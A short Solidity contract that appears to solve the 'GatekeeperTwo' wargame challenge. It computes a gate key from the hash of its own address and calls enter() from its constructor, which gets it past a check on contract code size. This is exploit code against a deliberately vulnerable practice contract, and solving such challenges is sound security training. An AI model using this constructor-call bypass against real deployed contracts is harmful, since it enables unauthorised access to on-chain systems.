// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
    constructor(address gatekeeperTwoAddress) {
        uint64 hashResult = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        bytes8 _gateKey = bytes8(type(uint64).max - hashResult);
        IGatekeeperTwo(gatekeeperTwoAddress).enter(_gateKey);
    }
}
